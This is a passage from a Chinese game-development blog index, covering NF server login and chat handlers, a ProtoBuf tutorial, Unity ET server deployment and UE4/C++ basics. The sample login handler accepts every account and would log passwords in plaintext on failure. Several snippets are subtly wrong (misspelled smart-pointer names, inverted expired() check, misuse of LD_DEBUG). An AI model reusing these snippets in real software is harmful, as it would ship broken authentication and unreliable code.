nPlayerID;\tNFMsg::ReqAccountLogin xMsg;\tif (!m_pNetModule-&gt;ReceivePB( msgID, msg, len, xMsg, nPlayerID))\t&#123;\t\treturn;\t&#125;\tNetObject* pNetObject = m_pNetModule-&gt;GetNet()-&gt;GetNetObject(sockIndex);\tif (pNetObject)\t&#123;\t\tif (pNetObject-&gt;GetConnectKeyState() == 0)\t\t&#123;\t\t\t//Normally, you could check the account and password is correct or not, but for our situation, it will correct by default as here is the tutorial code.\t\t\tint loginResult = 0;//0 means successful, else means error code from account platform.\t\t\tif (0 != loginResult)\t\t\t&#123;\t\t\t\tstd::ostringstream strLog;\t\t\t\tstrLog &lt;&lt; &quot;Check password failed, Account = &quot; &lt;&lt; xMsg.account() &lt;&lt; &quot; Password = &quot; &lt;&lt; xMsg.password();\t\t\t\tm_pLogModule-&gt;LogError(NFGUID(0, sockIndex), strLog, __FUNCTION__, __LINE__);\t\t\t\tNFMsg::AckEventResult xMsg;\t\t\t\txMsg.set_event_code(NFMsg::ACCOUNTPWD_INVALID);\t\t\t\tm_pNetModule-&gt;SendMsgPB(NFMsg::EGameMsgID::ACK_LOGIN, xMsg, sockIndex);\t\t\t\treturn;\t\t\t&#125;\t\t\tpNetObject-&gt;SetConnectKeyState(1);\t\t\tpNetObject-&gt;SetAccount(xMsg.account());\t\t\tNFMsg::AckEventResult xData;\t\t\txData.set_event_code(NFMsg::ACCOUNT_LOGIN_SUCCESS);\t\t\t//The login server responds the login result to the player by sock id.\t\t\tm_pNetModule-&gt;SendMsgPB(NFMsg::EGameMsgID::ACK_LOGIN, xData, sockIndex);\t\t\tm_pLogModule-&gt;LogInfo(NFGUID(0, sockIndex), &quot;Login succeeded :&quot;, xMsg.account().c_str());\t\t&#125;\t&#125;&#125;\n\n\n\n\n\n消息系统在同一个房间内如何让玩家之前可以互相发送消息。\n在NFComm/NFMessageDefine/NFDefine.proto里定义了请求响应枚举，默认已经定义了。\nREQ_CHAT\t\t\t\t\t\t\t\t= 350;ACK_CHAT\t\t\t\t\t\t\t\t= 351;\n\n消息结构定义在NFComm/NFMessageDefine/NFMsgShare.proto\nmessage ReqAckPlayerChat&#123;\tenum EGameChatChannel\t&#123;\t\tEGCC_GLOBAL = 0;\t\tEGCC_CLAN = 1;\t\tEGCC_FRIEND = 2;\t\tEGCC_BATTLE = 3;\t\tEGCC_TEAM = 4;\t\tEGCC_ROOM = 5;\t&#125;\tenum EGameChatType\t&#123;\t\tEGCT_TEXT= 0;\t\tEGCT_VOICE = 1;\t\tEGCT_EMOJI = 2;\t\tEGCT_DONATE_HERO = 10;\t\tEGCT_DONATE_BUILDING = 11;\t\tEGCT_DONATE_ITEM = 12;\t&#125;\tIdent\tplayer_id = 1;\tbytes \tplayer_name = 2;\tbytes \tplayer_hero_id = 3;\tbytes \tplayer_hero_level = 4;\tEGameChatChannel  chat_channel = 5;\tEGameChatType  chat_type = 6;\tbytes chat_info = 7;\tIdent\ttarget_id = 8;&#125;\n\n\n\n运行NFComm/NFMessageDefine/cpp.sh 生成对应的C++和CS代码文件\n将生成的_Out/NFDataCfg/client/里生成的CS文件复制到客户端项目Assets/Resources/NFDataCfg/\n增加一个模块到程序中 NFExamples/NFChatPlugin，NF已经实现了。\n编辑NFExamples&#x2F;NFChatPlugin&#x2F;NFChatModule.cpp文件，如下（默认已经实现）\nbool NFChatModule::AfterInit()&#123;\tm_pNetModule-&gt;AddReceiveCallBack(NFMsg::REQ_CHAT, this, &amp;NFChatModule::OnClientChatProcess);\treturn true;&#125;void NFChatModule::OnClientChatProcess(const NFSOCK sockIndex, const int msgID, const char* msg, const uint32_t len)&#123;\tCLIENT_MSG_PROCESS( msgID, msg, len, NFMsg::ReqAckPlayerChat);\tswitch (xMsg.chat_channel())\t&#123;\tcase NFMsg::ReqAckPlayerChat::EGCC_GLOBAL:\t&#123;\t\t//this code means the game server will sends a message to all players who playing game\t\tm_pNetModule-&gt;SendMsgPBToAllClient(NFMsg::ACK_CHAT, xMsg);\t&#125;\tbreak;\tcase NFMsg::ReqAckPlayerChat::EGCC_ROOM:\t&#123;\t\tconst int sceneID = m_pKernelModule-&gt;GetPropertyInt(nPlayerID, NFrame::Player::SceneID());\t\tconst int groupID = m_pKernelModule-&gt;GetPropertyInt(nPlayerID, NFrame::Player::GroupID());\t\t//this code means the game server will sends a message to all players who in the same room\t\tm_pGameServerNet_ServerModule-&gt;SendGroupMsgPBToGate(NFMsg::ACK_CHAT, xMsg, sceneID, groupID);\t&#125;\tbreak;\tdefault:\t&#123;\t\t//this code means the game server will sends a message yourself(nPlayerID)\t\tm_pGameServerNet_ServerModule-&gt;SendMsgPBToGate(NFMsg::ACK_CHAT, xMsg, nPlayerID);\t&#125;\tbreak;;\t&#125;&#125;\n\n","categories":["dev"],"tags":["server"]},{"title":"ProtoBuf","url":"/2022/09/17/dev/game/server/ProtoBuf/","content":"ProtoBuf基础介绍protobuffer是google开发的一种数据描述语言，它能够将结构化的数据序列化，并切可以将序列化的数据进行反序列化恢复原有的数据结构。一般用于数据存储以及通信协议方面。\n如果是第一次使用protobuffer,我们可以将其与json或者xml进行类比，其实它与json或xml类似都可以作为数据的存储方式，不同的是json和xml是文本格式，而protobuffer是二进制格式。二进制格式不利于使用者直观的阅读，但是与json以及xml相比它有更多的优点。\nprotoBuffer相比于xml的优点更加简介体积小：消息大小只需要xml的1&#x2F;101&#x2F;3解析速度快：解析速度比xml快20100倍使用proto Buffer的编译器，可以生成方便在编程中使用的数据访问代码.具有更好的兼容性，很好的支持向上或向下兼容的特性提供多种序列化的出口和入口,如文件流，string流,array流等等\nproto文件来预先定义的消息格式。数据包是按照proto文件所定义的消息格式完成二进制码流的编码和解码。proto文件，它是一个消息的协议文件，这个协议文件的后缀文件名为“.proto”。\nprotobuffer语法消息类型实例：\nPackage example;message Person&#123;  required string name = 1;  required int32 id = 2;  optional string email = 3;  enum PhoneType&#123;    mobile = 1;    home = 2;    work = 3;  &#125;  message PhoneNumber&#123;    required string number = 1;    optional PhoneType type = 2;  &#125;  repeated PhoneNumber phone = 4;&#125;\n\n\n指定字段规则protobuffer中字段规则包括一下三种：\nrequired：实例中必须包含的字段optional：实例中可以选择性包含的字段，若实例没有指定，则为默认值，若没有设置该字段的默认值，其值是该类型的默认值。如string默认值为””，bool默认值为false,整数默认值为0。repeated: 可以有多个值的字段，这类变量类似于vector，可以存储此类型的多个值。由于一些历史原因，基本数值类型的repeated的字段并没有被尽可能地高效编码。在新的代码中，用户应该使用特殊选项[packed&#x3D;true]来保证更高效的编码。一般情况下慎重使用required字段，当此字段一定是必要的时候才使用。\nrepeated使用实例：\nmessage Person &#123;    required int32 age = 1;    required string name = 2;  &#125;  message Family &#123;    repeated Person person = 1;  &#125;\n\n\nc代码\nint main(int argc, char* argv[])  &#123;  \tGOOGLE_PROTOBUF_VERIFY_VERSION;  \tFamily family;  \tPerson* person;  \t// 添加一个家庭成员，John  \tperson = family.add_person();  \tperson-&gt;set_age(25);  \tperson-&gt;set_name(&quot;John&quot;);  \t// 添加一个家庭成员，Lucy  \tperson = family.add_person();  \tperson-&gt;set_age(23);  \tperson-&gt;set_name(&quot;Lucy&quot;);  \t// 添加一个家庭成员，Tony  \tperson = family.add_person();  \tperson-&gt;set_age(2);  \tperson-&gt;set_name(&quot;Tony&quot;);  \t// 显示所有家庭成员  \tint size = family.person_size();  \t\tcout &lt;&lt; &quot;这个家庭有 &quot; &lt;&lt; size &lt;&lt; &quot; 个成员，如下：&quot; &lt;&lt; endl;  \t\tfor(int i=0; i&lt;size; i++)  \t&#123;  \t    Person psn = family.person(i);  \t    cout &lt;&lt; i+1 &lt;&lt; &quot;. &quot; &lt;&lt; psn.name() &lt;&lt; &quot;, 年龄 &quot; &lt;&lt; psn.age() &lt;&lt; endl;  \t&#125;  \tgetchar();  \treturn 0;  &#125;  \n数据类型protobuffer中的数据类型与C++数据类型之间的关联如下：\nprotobuffer类型\tC++类型double\tdoublefloat\tfloatint32\tint32int64\tint64uint32\tuint32uint64\tuint64sint32\tint32sint64\tint64fixed32\tuint32fixed64\tuint64sfixed32\tuint32sfixed64\tuint64bool\tboolstring\tstringbytes\tstring\n\n\n枚举当需要定义一个消息类型的时候，我们可能想为某一个字段指定预定义列表中的值。这个时候就需要用到枚举\n如：\nmessage SearchRequest &#123;  required string query = 1;  optional int32 page_number = 2;  optional int32 result_per_page = 3 [default = 10];  enum Corpus &#123;    UNIVERSAL = 0;    WEB = 1;    IMAGES = 2;    LOCAL = 3;    NEWS = 4;    PRODUCTS = 5;    VIDEO = 6;  &#125;  optional Corpus corpus = 4 [default = UNIVERSAL];&#125;\n\n\n\n变量标识号在proto数据结构中，每一个变量都有唯一的数字标识。这些标识符的作用是在二进制格式中识别各个字段的，一旦开始使用就不可再改变。\n此处需要注意的是1-15之内的标号在存储的时候只占一个字节，而大于15到162047之间的需要占两个字符，所以我们尽量为频繁使用的字段分配1-15内的标识号。另外19000-19999之内的标识号已经被预留，不可用。最大标识号为2^29-1。\n嵌套protobuffer中的消息可以嵌套消息，也就是在一个message中定义另一个message。如上面实例可以看出。\n扩展我们可以通过扩展对proto文件进行扩展，而不需要直接区编辑原文件。\n例如有原文件:\nmessage Foo&#123;  //...  extensions 100 to 199;&#125;\n\n\n\n上述extensions 100 to 199表示此范围内的标识号被保留为扩展用。我们在扩展文件中就可以使用这些标识号了。\nextend Foo&#123;  optional int32 bar = 126;&#125;\n\n\n\n述为扩展。当用户的Foo消息被编码的时候，数据的传输格式与用户在Foo里定义新字段的效果是完全一样的。然而，要在程序代码中访问扩展字段的方法与访问普通的字段稍有不同——生成的数据访问代码为扩展准备了特殊的访问函数来访问它。例如，下面是如何在C++中设置bar的值：\nFoo foo;foo.SetExtentions(bar, 15);\n\n\n注释与c++注释风格相同。双斜杠\n包向上且向下兼容更新消息当在需求不断增加的过程中，数据结构也会不断变化，这个时候就需要我们去更新消息。怎么才能做到更新消息不会影响之前的数据和代码。这个时候我们更新消息需要遵循以下几个原则：\n不要更改任何已有的字段的数值标识所添加的字段必须是optional或者repeated。包名称解析为了防止消息明明冲突，我们往往会在文件的开始出生命包，包的作用相当于命名空间。在编译成C++代码时也是namespace。例如：\npackage foo.bar;message open&#123;  ///...&#125;\n\n在C++对open进行访问的时候的访问方式为:\nfoo::bar::open test;\n\n生成C++程序使用protobuffer按照上面的规则我们可以设计出合理的protobuffer类型。然后下一步就是将proto文件生成C++头文件和实现文件,将.proto文件编译成C接口的方法如下：\nprotoc -I=SOURCE_DIR --cpp_out=DIST_DIR test.proto\n\n编译使用proto生成的头文件进行编译时需要链接protobuffer库。具体为:\ng++ main.cpp test.pb.cc -lprotobuf\n\n常用接口protobuffer编译为C++代码的常用接口对于C++来说，编译器会为每个.proto文件生成一个.h文件和.cc文件。.proto文件中的每一个消息对应一个类。protobuffer中常用的函数：\nhas_name() :判断是否有当前成员clear_name() :清空该成员变量值name() :获取成员的变量值set_name(string) :设置变量值set_name(const char*):设置变量值set_name(int) :设置变量值clear() :清空所有元素为空状态void CopyFrom(person):从给定的对象复制。mutable_name() :获取变量name的指针add_name() :为repeated变量增加值ByteSize() :获取变量所占的字节数若有元素data属性为repeated，其行为类似于vector,则此时则可用下列函数：add_data() : 添加data元素，返回值为Date*类型。data_size() : 获取repeated元素size，即元素的个数。data(i) : 获取data中地i个元素。ByteSize() : 获取序列化之后的protobuff对象的长度。CopyFrom(const ProtoType&amp;): 从一个protobuf对象拷贝到另一个\n\n常用的序列化方法C数组的序列化与反序列化的API如果想将其序列为char*并通过socket进行传输，这是使用SerializeToArray来达到目的。除了下述的SerializeToArray方法之外，还有方法SerializePartialToArray，两者用法相同，其中唯一的区别在于SerializePartialToArray允许忽略required字段，而前者不允许\nvoid* parray = (char*)malloc(256);//APIbool ParseFromArray(const void* data, int size);bool SerializeToArray(void* data. int size);void set_people()               &#123;      wp.set_name(&quot;sealyao&quot;);         wp.set_id(123456);              wp.set_email(&quot;sealyaog@gmail.com&quot;);      wp.SerializeToArray(parray,256);  &#125;  void get_people()               &#123;      rap.ParseFromArray(parray,256);      cout &lt;&lt; &quot;Get People from Array:&quot; &lt;&lt; endl;      cout &lt;&lt; &quot;\\t Name : &quot; &lt;&lt;rap.name() &lt;&lt; endl;      cout &lt;&lt; &quot;\\t Id : &quot; &lt;&lt; rap.id() &lt;&lt; endl;      cout &lt;&lt; &quot;\\t email : &quot; &lt;&lt; rap.email() &lt;&lt; endl;  &#125;\n\nC++ String的序列化与反序列化API除了下述的SerializeToString方法之外，还有方法SerializePartialToString，两者用法相同，其中唯一的区别在于SerializePartialToString允许忽略required字段，而前者不允许\n//C++string序列化和序列化APIbool SerializeToString(string* output) const;bool ParseFromString(const string&amp; data); //使用：void set_people()               &#123;      wp.set_name(&quot;sealyao&quot;);         wp.set_id(123456);              wp.set_email(&quot;sealyaog@gmail.com&quot;);      wp.SerializeToString(&amp;pstring);  &#125;void get_people()               &#123;      rsp.ParseFromString(pstring);        cout &lt;&lt; &quot;Get People from String:&quot; &lt;&lt; endl;      cout &lt;&lt; &quot;\\t Name : &quot; &lt;&lt;rsp.name() &lt;&lt; endl;      cout &lt;&lt; &quot;\\t Id : &quot; &lt;&lt; rsp.id() &lt;&lt; endl;      cout &lt;&lt; &quot;\\t email : &quot; &lt;&lt; rsp.email() &lt;&lt; endl;  &#125;  \n\n\n\n文件描述符序列化与反序列化API//文件描述符的序列化和序列化API bool SerializeToFileDescriptor(int file_descriptor) const;bool ParseFromFileDescriptor(int file_descriptor);  \n\n使用: \nvoid set_people() &#123;     fd = open(path,O_CREAT|O_TRUNC|O_RDWR,0644);    if(fd &lt;= 0)&#123;        perror(&quot;open&quot;);       exit(0);   &#125;        wp.set_name(&quot;i0gan&quot;);   wp.set_id(123456);     wp.set_email(&quot;i0gan@pwnsky.com&quot;);   wp.SerializeToFileDescriptor(fd);   close(fd);&#125;void get_people()&#123;   fd = open(path,O_RDONLY);   if(fd &lt;= 0)&#123;       perror(&quot;open&quot;);       exit(0);   &#125;   rp.ParseFromFileDescriptor(fd);   std::cout &lt;&lt; &quot;Get People from FD:&quot; &lt;&lt; endl;   std::cout &lt;&lt; &quot;\\t Name : &quot; &lt;&lt;rp.name() &lt;&lt; endl;   std::cout &lt;&lt; &quot;\\t Id : &quot; &lt;&lt; rp.id() &lt;&lt; endl;   std::cout &lt;&lt; &quot;\\t email : &quot; &lt;&lt; rp.email() &lt;&lt; endl;   close(fd);&#125;\n\nC++ stream 序列化和反序列化API//C++ stream 序列化/反序列化API bool SerializeToOstream(ostream* output) const; bool ParseFromIstream(istream* input);  \n\n使用： \nvoid set_people() &#123;     fstream fs(path,ios::out|ios::trunc|ios::binary);     wp.set_name(&quot;i0gan&quot;);     wp.set_id(123456);     wp.set_email(&quot;i0gan@pwnsky.com&quot;);     wp.SerializeToOstream(&amp;fs);     fs.close();     fs.clear(); &#125;  void get_people() &#123;     fstream fs(path,ios::in|ios::binary);     rp.ParseFromIstream(&amp;fs);     std::cout &lt;&lt; &quot;\\t Name : &quot; &lt;&lt;rp.name() &lt;&lt; endl;     std::cout &lt;&lt; &quot;\\t Id : &quot; &lt;&lt; rp.id() &lt;&lt; endl;      std::cout &lt;&lt; &quot;\\t email : &quot; &lt;&lt; rp.email() &lt;&lt; endl;     fs.close();     fs.clear(); &#125; \n\n\n\nstring和bytes类型的区别string与bytes区别按照经验我们知道bytes一般适用于存储二进制数据的，但在C++中,string既可以存储ASCII文本字符串，也能存储任意多个\\0的二进制序列，那两者的区别在哪里呢？\nstring类型（protobuffer中的string，与C++区别开）不能存储非法的UTF-8字符，如果遇到该字符，序列化的时候将会出错。\n[libprotobuf ERROR google/protobuf/wire_format.cc:1091] String field ‘str’ contains invalid UTF-8 data when serializing a protocol buffer. Use the ‘bytes’ type if you intend to send raw bytes.\n\n出现上述错误的原因这里从ProtoBuf的源码进行分析。protoBuf在序列化的过程中，都会调用SerializeFieldWithCachedSizes这个函数。我们看一下序列化string和bytes在序列化过程中的区别。\n对于string类型：\ncase FieldDescriptor::TYPE_STRING: &#123;  string scratch;  const string&amp; value = field-&gt;is_repeated() ?    message_reflection-&gt;GetRepeatedStringReference(      message, field, j, &amp;scratch) :    message_reflection-&gt;GetStringReference(message, field, &amp;scratch);  VerifyUTF8StringNamedField(value.data(), value.length(), SERIALIZE,                             field-&gt;name().c_str());  WireFormatLite::WriteString(field-&gt;number(), value, output);  break;&#125;\n\n对于bytes类型：\ncase FieldDescriptor::TYPE_BYTES: &#123;        string scratch;        const string&amp; value = field-&gt;is_repeated() ?          message_reflection-&gt;GetRepeatedStringReference(            message, field, j, &amp;scratch) :          message_reflection-&gt;GetStringReference(message, field, &amp;scratch);        WireFormatLite::WriteBytes(field-&gt;number(), value, output);        break;&#125;\n\n从上面可以看到，序列化string和bytes的区别主要在于:string类型序列化调用了VerifyUTF8StringNamedField函数检验string中是否有非法的UTF-8字符。其中VerifyUTF8StringNamedField实现如下：\nvoid WireFormat::VerifyUTF8StringFallback(const char* data,                                          int size,                                          Operation op,                                          const char* field_name) &#123;  if (!IsStructurallyValidUTF8(data, size)) &#123;    const char* operation_str = NULL;    switch (op) &#123;      case PARSE:        operation_str = &quot;parsing&quot;;        break;      case SERIALIZE:        operation_str = &quot;serializing&quot;;        break;      // no default case: have the compiler warn if a case is not covered.    &#125;    string quoted_field_name = &quot;&quot;;    if (field_name != NULL) &#123;      quoted_field_name = StringPrintf(&quot; &#x27;%s&#x27;&quot;, field_name);    &#125;    // no space below to avoid double space when the field name is missing.    GOOGLE_LOG(ERROR) &lt;&lt; &quot;String field&quot; &lt;&lt; quoted_field_name &lt;&lt; &quot; contains invalid &quot;               &lt;&lt; &quot;UTF-8 data when &quot; &lt;&lt; operation_str &lt;&lt; &quot; a protocol &quot;               &lt;&lt; &quot;buffer. Use the &#x27;bytes&#x27; type if you intend to send raw &quot;               &lt;&lt; &quot;bytes. &quot;;  &#125;&#125;\n\nstring和bytes类型在C++和Java中的区别protobuf类型在C++和java中的类型对应如下：\n在C++中，string和bytes的实现都是std::string类型。在Java中string和bytes类型的实现分别是String和ByteString。\n参考ref: https://blog.csdn.net/u014630623/article/details/88992609\nref: https://blog.csdn.net/qq_41358574/article/details/123903840\nref：https://blog.csdn.net/u014630623/article/details/88992598\n","categories":["dev"],"tags":["server"]},{"title":"Unity之ET框架","url":"/2022/09/16/dev/game/u3d/Unity%E4%B9%8BET%E6%A1%86%E6%9E%B6/","content":"Unity之ET框架介绍ET是一个开源的游戏客户端（基于unity3d）服务端双端框架，服务端是使用C# .net core开发的分布式游戏服务端，其特点是开发效率高，性能强，双端共享逻辑代码，客户端服务端热更机制完善，同时支持可靠udp tcp websocket协议，支持服务端3D recast寻路等等\n功能1.可用VS单步调试的分布式服务端，N变1一般来说，分布式服务端要启动很多进程，一旦进程多了，单步调试就变得非常困难，导致服务端开发基本上靠打log来查找问题。平常开发游戏逻辑也得开启一大堆进程，不仅启动慢，而且查找问题及其不方便，要在一堆堆日志里面查问题，这感觉非常糟糕，这么多年也没人解决这个问题。ET框架使用了类似守望先锋的组件设计，所有服务端内容都拆成了一个个组件，启动时根据服务器类型挂载自己所需要的组件。这有点类似电脑，电脑都模块化的拆成了内存，CPU，主板等等零件，搭配不同的零件就能组装成一台不同的电脑，例如家用台式机需要内存，CPU，主板，显卡，显示器，硬盘。而公司用的服务器却不需要显示器和显卡，网吧的电脑可能不需要硬盘等。正因为这样的设计，ET框架可以将所有的服务器组件都挂在一个服务器进程上，那么这个服务器进程就有了所有服务器的功能，一个进程就可以作为整组分布式服务器使用。这也类似电脑，台式机有所有的电脑组件，那它也完全可以当作公司服务器使用，也可以当作网吧电脑。\n2.随意可拆分功能的分布式服务端，1变N分布式服务端要开发多种类型的服务器进程，比如Login server，gate server，battle server，chat server friend server等等一大堆各种server，传统开发方式需要预先知道当前的功能要放在哪个服务器上，当功能越来越多的时候，比如聊天功能之前在一个中心服务器上，之后需要拆出来单独做成一个服务器，这时会牵扯到大量迁移代码的工作，烦不胜烦。ET框架在平常开发的时候根本不太需要关心当前开发的这个功能会放在什么server上，只用一个进程进行开发，功能开发成组件的形式。发布的时候使用一份多进程的配置即可发布成多进程的形式，是不是很方便呢？随便你怎么拆分服务器。只需要修改极少的代码就可以进行拆分。不同的server挂上不同的组件就行了嘛！\n3.跨平台的分布式服务端ET框架使用C#做服务端，现在C#是完全可以跨平台的，在linux上安装.netcore，即可，不需要修改任何代码，就能跑起来。性能方面，现在.netcore的性能非常强，比lua，python，js什么快的多了。做游戏服务端完全不在话下。平常我们开发的时候用VS在windows上开发调试，发布的时候发布到linux上即可。ET框架还提供了一键同步工具，打开unity-&gt;tools-&gt;rsync同步，即可同步代码到linux上\n./Run.sh Config/StartConfig/192.168.12.188.txt \n\n\n\n\n\n案例ET开发的商业mmo项目千古风流成功上线\n发布服务端修改服务端配置文件在Excel\\StartConfig\\Release目录下修改\n&#83;&#x74;&#97;&#114;&#116;&#x4d;&#97;&#99;&#104;&#x69;&#110;&#x65;&#67;&#111;&#110;&#x66;&#105;&#x67;&#x40;&#115;&#46;&#120;&#108;&#x73;&#120; 修改内外网ip为自己的外网ip，建议都改成”0.0.0.0”，全网卡监听。\n&#83;&#116;&#97;&#114;&#116;&#x5a;&#x6f;&#x6e;&#x65;&#x43;&#x6f;&#x6e;&#102;&#105;&#x67;&#64;&#x73;&#x2e;&#x78;&#x6c;&#115;&#x78;：为MongoDB 的配置文件，搭建了MongoDB也可以更改一下\n运行环境搭建以linux ubuntu20.04为例，其他版本可参考微软文档，先安装运行库\n使用 APT 进行安装可通过几个命令来完成。 安装 .NET 之前，请运行以下命令，将 Microsoft 包签名密钥添加到受信任密钥列表，并添加包存储库。\n打开终端并运行以下命令：\nwget https://packages.microsoft.com/config/ubuntu/20.04/packages-microsoft-prod.deb -O packages-microsoft-prod.debsudo dpkg -i packages-microsoft-prod.debrm packages-microsoft-prod.deb\n\n安装运行时\n通过 ASP.NET Core 运行时，可以运行使用 .NET 开发且未提供运行时的应用。 以下命令将安装 ASP.NET Core 运行时，这是与 .NET 最兼容的运行时。 在终端中，运行以下命令：\nsudo apt-get update &amp;&amp; \\  sudo apt-get install -y aspnetcore-runtime-6.0\n\n 重要\n如果收到类似于“找不到包 aspnetcore-runtime-6.0”的错误消息，请参阅 APT 疑难解答部分。\n作为 ASP.NET Core 运行时的一种替代方法，你可以安装不包含 ASP.NET Core 支持的 .NET 运行时：将上一命令中的 aspnetcore-runtime-6.0 替换为 dotnet-runtime-6.0：\nsudo apt-get install -y dotnet-runtime-6.0\n\n\n\n\n\n运行包上传编译的目录实在工程的Bin目录下，将其拷贝到服务端即可，我的服务端路径为：/srv/pwnsky/ble/server并且在服务端将其创建，采\n用rsync来进行拷贝。\n# 拷贝二进制文件rsync -avz --delete ./Bin/ root@ble.pwnsky.com:/srv/pwnsky/ble/server/Bin/# 拷贝配置文件rsync -avz --delete ./Config/ root@ble.pwnsky.com:/srv/pwnsky/ble/server/Config/\n\n\n\n\n\n启动服务器cd /srv/pwnsky/ble/server/Bin &amp;&amp; dotnet Server.dll --Process=1 --StartConfig=StartConfig/Release --Console=1\n\n查看是否启动\nnetstat -antup | grep dotnet\n\n本地测试命令\ndotnet Server.dll --Process=1 --StartConfig=StartConfig/Localhost --Console=1\n\n在启动时，会出现\n&gt; 2022-09-16 17:11:14.7523 System.DllNotFoundException: Unable to load shared library &#x27;RecastDll&#x27; or one of its dependencies. In order to help diagnose loading problems, consider setting the LD_DEBUG environment variable: libRecastDll: cannot open shared object file: No such file or directory.\n\n设定\nLD_DEBUG=net6.0/RecastDll.dll &amp;&amp; cd /srv/pwnsky/ble/server/Bin &amp;&amp; dotnet Server.dll --Process=1 --StartConfig=StartConfig/Release --Console=1\n\n","categories":["dev"],"tags":["unity3d"]},{"title":"UE4基础","url":"/2022/09/09/dev/game/ue4/UE4%E5%9F%BA%E7%A1%80/","content":"UE4基础文档：https://docs.unrealengine.com/4.27/en-US/\nUE4项目目录结构Binarires：存放编译生成结果的二进制文件\nConfig：存放当前项目的配置文件（中医）\nContent：存放平常最常用到所有的资源和蓝图（重要）\nIntermediate：中间文件（gitignore)，存放一些临时生成的文件\nSave：存储自动保存的文件，日志文件，引擎崩溃日志，硬件信息，烘焙信息数据等。\nSource：C++源码文件（重要）\nDerivedDataCache：渲染缓存，C盘不够的情况下，会将缓存文件存储在该目录下。\n编译类型编译类型分为两种：\nEditor：编辑器型与UE4Editor配合编译便于制作开发\nGame：游戏型可以直接从源代码运行游戏不关心编辑端\nDebugGame：游戏调试（只适合游戏代码）DebugGame Editor：游戏调试时通过UE4Editor进行调试Development：游戏开发型调试（适合查看源代码执行）Development Ediotr：游戏开发型调试在UE4Editor中进行（默认情况）Shipping：发现模式没有了调试辅助\n\n\n\n\n\n\n\n编译系统UE4支持全平台开发，为了方便开发者使用同一套代码在全平台下发布，所以UE4使用了自定义编译系统。他也可以保证开发者的代码包括在UE4Editor下的参数设定，可以全平台适用。\n这套自定义编译系统是在VS编辑器后台通过命令行默默执行的，他最重要的两个工具是UBT和UHT。\nUBT（Unreal Build Tools）\n* ue4自定义的一种编译工具\n* 他使用的是C#语言\n* 用来逐步编译Engine的代码模块和项目的代码模块\n* 对项目的C++代码来说主要用于处理项目对引擎功能模块的依赖\n\nUHT（Unreal Header Tool）\n* ue4 对项目C++代码的解析工具\n* 它可以将项目的C++代码翻译成UE4 Editor认识的特殊编码\n* 它主要是为了给UE4Editor提供C++代码的可视化功能\n\nC++基础foreachint numbers[] = &#123;1, 2, 3, 4, 5&#125;;for (auto c : numbers) &#123;\tcout &lt;&lt; c &lt;&lt; endl;&#125;\n\n智能指针auto_ptrvoid TestAutoPtr() &#123;\tauto_ptr&lt;Myclass&gt; p(new Myclass);\tif(nullptr != p.get) &#123;\t\tp.get()-&gt;member = &quot;aaa&quot;; // 当赋值给另一个智能指针时，原来的智能指针无效\t\tp-&gt;Print();        // p-&gt;member = &quot;aaa&quot;; // 不建议使用        // p.release(); // 会返回 Myclass*，需要手动释放指向的内存。\t&#125;&#125;\n\nshared_ptrshared_ptr&lt;int&gt; p1(new int(10));shared_ptr&lt;int&gt; p1;p1 = make_shared&lt;int&gt;(10);// shared_ptr&lt;int&gt; p2(p1); //拷贝构造// shared_ptr&lt;int&gt; p3(move(p1));// 移动构造// p2.use_count(); // 返回使用次数\n\n\n\nwake_ptrwake_ptr&lt;int&gt; pw1;shared_ptr&lt;int&gt; ps1 = make_share&lt;int&gt;(1);pw1 = ps1; // 不会增加ps1的引用计数// 注意：因为弱引用指针不会增加计数器，为了程序安全，不能作为返回值。一般用作形参。// 在使用的时候需要锁住对象，避免对象释放掉了再使用。if(ps1.expired()) &#123; // 表示安全\t*(ps1.lock().get()) = 10; // lock返回共享指针，并对里面的值进行赋值。&#125;\n\n\n\nunique_ptr```### Lamda```c++#include&lt;iostream&gt;#include&lt;functional&gt;using namespace std;int main() &#123;        auto f = [](int a, int b) &#123;                return a + b;        &#125;;        cout &lt;&lt; f(1, 2) &lt;&lt; endl;         int a = 4;        auto f2 = [=](int b) &#123; // =代表值捕获当前作用域内的所有变量                return a + b;        &#125;;        cout &lt;&lt; f2(2) &lt;&lt; endl;        auto f3= [&amp;](int b) &#123; // &amp;代表地址捕获当前作用域内的所有变量                return a + b;        &#125;;        cout &lt;&lt; f3(2) &lt;&lt; endl;        int c = 5;        auto f4= [=, &amp;c](int b) &#123; // 值捕获全部变量，c进行地址捕获                return a + b + c;        &#125;;        cout &lt;&lt; f4(2) &lt;&lt; endl;                // 采用function来获取返回值调用        function&lt;int(int, int)&gt; f5 = [&amp;](int a, int b)-&gt; int &#123;                 return a + b + c;        &#125;;        cout &lt;&lt; f5(1, 2) &lt;&lt; endl;                // 直接调用        cout &lt;&lt; [=](int a, int b)-&gt; int &#123;                return a + b + c;        &#125;(1, 2);&#125;\n\n\n\n\n\n\n\nUE4 C++ 基础命名规则虚幻引擎封装了许多自定义的数据类型：类、结构、枚举；\n自定义了所有的数据结构：动态数组、链表、集合、图、各种字符串操作；\n对自己的封装形式做了如下区分：\nA字母开头：表示当前类对象来自于AActor\nU字母开头：表示它一定继承于UObject\nF字母开头：大量使用在结构体当中，也有很多类使用他开头，如果类使用F开头，表示当前类不会继承UObject；\nI字母开头：表示当前对象是接口类型；&#x2F;&#x2F; 继承了大量的纯虚函数，没有实现，需要自己实现。\nE字母开头：表示当前类型是枚举；\nT字母开头：表示模板类，一般用于数据结构定义，多线程安全类；\n如果字母全部大写，那么表示宏定义出来的。\n打印日志虚幻引擎日志分为两类：\n终端输出\n屏幕输出\n需要注意的是， 虚幻引擎本身采用的是UTF-16字符编码集，Windows采用的是Unicode，两个字符集不通用，只有ASCII码表可以交互，对中文输出是乱码。\n终端输出虚幻引擎将日志分为三类：\nMessage（描述一般信息）\nWarrning（描述警告，一般为黄色）\nError（描述发送致命错误，红颜色）\n向终端输出函数：\nUE_LOG(日志分类， 日志种类， 字符串格式化， 字符串参数， …)\nUE_LOG(LogTemp, Warning, TEXT(&quot;开始&quot;));UE_LOG(LogTemp, Display, TEXT(&quot;display&quot;));UE_LOG(LogTemp, Warning, TEXT(&quot;The Actor&#x27;s name is %s&quot;), TEXT(&quot;Myactor&quot;));\n\n\n\n自定义log类型：\n头文件中声明\nDECLARE_LOG_CATEGORY_CLASS(MyLog, Log, All); // 自定义log类型\n\ncpp文件中实例\nDEFINE_LOG_CATEGORY_CLASS(AMyActor, MyLog);// 使用UE_LOG(MyLog, Display, TEXT(&quot;display&quot;));\n\n\n\n屏幕输出void UEngine::AddOnScreenDebugMessage(int32 Key, float TimeToDisplay, FColor DisplayColor, const FString&amp; DebugMessage, bool bNewerOnTop, const 